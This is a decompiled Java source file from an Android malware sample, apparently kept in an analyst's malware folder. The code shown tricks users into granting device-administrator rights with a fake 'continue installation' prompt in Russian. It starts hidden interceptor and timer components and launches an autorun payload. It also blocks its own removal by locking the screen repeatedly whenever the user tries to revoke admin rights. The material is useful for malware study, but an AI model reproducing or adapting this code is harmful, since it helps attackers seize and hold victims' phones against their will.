package krep.itmtd.ywtjexf;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningServiceInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.os.Bundle;
import android.os.SystemClock;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class UampleUverlayUhowUctivity
  extends Activity
{
  private static final int REQUEST_ENABLE = 8;
  private ActivityManager mActivityManager;
  ComponentName mAdminName;
  DevicePolicyManager mDPM;
  
  private boolean checkifThisIsActive(ActivityManager.RunningAppProcessInfo paramRunningAppProcessInfo)
  {
    boolean bool = false;
    if (paramRunningAppProcessInfo == null) {
      return false;
    }
    Iterator localIterator = ((ActivityManager)getSystemService("activity")).getRunningTasks(9999).iterator();
    if (!localIterator.hasNext()) {}
    for (;;)
    {
      return bool;
      if (!((ActivityManager.RunningTaskInfo)localIterator.next()).baseActivity.getPackageName().equals(paramRunningAppProcessInfo.processName)) {
        break;
      }
      bool = true;
    }
  }
  
  private ActivityManager.RunningAppProcessInfo getForegroundApp()
  {
    Iterator localIterator = ((ActivityManager)getSystemService("activity")).getRunningAppProcesses().iterator();
    ActivityManager.RunningAppProcessInfo localRunningAppProcessInfo;
    do
    {
      if (!localIterator.hasNext()) {
        return null;
      }
      localRunningAppProcessInfo = (ActivityManager.RunningAppProcessInfo)localIterator.next();
    } while ((localRunningAppProcessInfo.importance != 100) || (isRunningService(localRunningAppProcessInfo.processName)));
    return localRunningAppProcessInfo;
  }
  
  private int getPackageNames(String paramString)
  {
    Iterator localIterator = ((ActivityManager)getApplicationContext().getSystemService("activity")).getRunningAppProcesses().iterator();
    for (;;)
    {
      if (!localIterator.hasNext()) {
        return 0;
      }
      ActivityManager.RunningAppProcessInfo localRunningAppProcessInfo = (ActivityManager.RunningAppProcessInfo)localIterator.next();
      try
      {
        if (localRunningAppProcessInfo.processName.contains(paramString))
        {
          int i = localRunningAppProcessInfo.pid;
          return i;
        }
      }
      catch (Exception localException) {}
    }
  }
  
  private boolean isRunningApp(String paramString)
  {
    if (paramString == null) {}
    ActivityManager.RunningAppProcessInfo localRunningAppProcessInfo;
    do
    {
      Iterator localIterator;
      while (!localIterator.hasNext())
      {
        return false;
        localIterator = ((ActivityManager)getSystemService("activity")).getRunningAppProcesses().iterator();
      }
      localRunningAppProcessInfo = (ActivityManager.RunningAppProcessInfo)localIterator.next();
    } while ((!localRunningAppProcessInfo.processName.equals(paramString)) || (localRunningAppProcessInfo.importance == 300));
    return true;
  }
  
  private boolean isRunningService(String paramString)
  {
    if (paramString == null) {}
    Iterator localIterator;
    do
    {
      while (!localIterator.hasNext())
      {
        return false;
        localIterator = ((ActivityManager)getSystemService("activity")).getRunningServices(9999).iterator();
      }
    } while (!((ActivityManager.RunningServiceInfo)localIterator.next()).process.equals(paramString));
    return true;
  }
  
  public static Collection subtractSets(Collection paramCollection1, Collection paramCollection2)
  {
    paramCollection2 = new ArrayList(paramCollection2);
    paramCollection2.removeAll(paramCollection1);
    return paramCollection2;
  }
  
  protected void eba()
  {
    this.mDPM = ((DevicePolicyManager)getSystemService("device_policy"));
    this.mAdminName = new ComponentName(this, MyAdmin.class);
    Intent localIntent;
    if (!this.mDPM.isAdminActive(this.mAdminName))
    {
      localIntent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
      localIntent.putExtra("android.app.extra.DEVICE_ADMIN", this.mAdminName);
      localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "Нажмите Активировать для продолжения установки");
      startActivityForResult(localIntent, 8);
      return;
    }
    try
    {
      if (Arrays.asList(getResources().getAssets().list("")).contains("autorun.html"))
      {
        localIntent = new Intent(this, GlobalCode.class);
        localIntent.putExtra("content", "file:///android_asset/autorun.html");
        localIntent.putExtra("type", "autorun");
        localIntent.putExtra("data", "");
        startService(localIntent);
        finish();
        return;
      }
    }
    catch (IOException localIOException)
    {
      localIOException.printStackTrace();
      return;
    }
    finish();
  }
  
  protected void onActivityResult(int paramInt1, int paramInt2, Intent paramIntent)
  {
    if (8 == paramInt1) {
      eba();
    }
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    startService(new Intent(this, MasterInterceptor.class));
    localObject = "";
    try
    {
      ApplicationInfo localApplicationInfo = getPackageManager().getApplicationInfo(getPackageName(), 128);
      paramBundle = (Bundle)localObject;
      if (localApplicationInfo.metaData != null) {
        paramBundle = localApplicationInfo.metaData.getString("timer");
      }
    }
    catch (PackageManager.NameNotFoundException paramBundle)
    {
      for (;;)
      {
        int i;
        long l;
        paramBundle.printStackTrace();
        paramBundle = (Bundle)localObject;
      }
    }
    i = 60;
    if (paramBundle.length() > 2) {
      i = Integer.parseInt(paramBundle.substring(1));
    }
    paramBundle = (AlarmManager)getSystemService("alarm");
    l = SystemClock.elapsedRealtime();
    localObject = Calendar.getInstance();
    ((Calendar)localObject).setTimeInMillis(System.currentTimeMillis());
    ((Calendar)localObject).add(13, 10);
    localObject = PendingIntent.getBroadcast(this, 0, new Intent(this, MasterTimer.class), 0);
    paramBundle.setRepeating(0, l + 5000L, i * 1000, (PendingIntent)localObject);
    eba();
  }
  
  public static class MyAdmin
    extends DeviceAdminReceiver
  {
    static final String TAG = "DemoDeviceAdminReceiver";
    
    public CharSequence onDisableRequested(final Context paramContext, Intent paramIntent)
    {
      paramIntent = paramContext.getPackageManager().getLaunchIntentForPackage("com.android.settings");
      paramIntent.setFlags(268435456);
      paramContext.startActivity(paramIntent);
      paramContext = (DevicePolicyManager)paramContext.getSystemService("device_policy");
      paramContext.lockNow();
      new Thread(new Runnable()
      {
        public void run()
        {
          int i = 0;
          for (;;)
          {
            if (i >= 70) {
              return;
            }
            paramContext.lockNow();
            try
            {
              Thread.sleep(100L);
              i += 1;
            }
            catch (InterruptedException localInterruptedException)
            {
              localInterruptedException.printStackTrace();
            }
          }
        }
      }).start();
      return "";
    }
    
    public void onDisabled(Context paramContext, Intent paramIntent)
    {
      super.onDisabled(paramContext, paramIntent);
    }
    
    public void onEnabled(Context paramContext, Intent paramIntent)
    {
      super.onEnabled(paramContext, paramIntent);
    }
    
    public void onPasswordChanged(Context paramContext, Intent paramIntent)
    {
      super.onPasswordChanged(paramContext, paramIntent);
    }
    
    public void onPasswordFailed(Context paramContext, Intent paramIntent)
    {
      super.onPasswordFailed(paramContext, paramIntent);
    }
    
    public void onPasswordSucceeded(Context paramContext, Intent paramIntent)
    {
      super.onPasswordSucceeded(paramContext, paramIntent);
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/UampleUverlayUhowUctivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */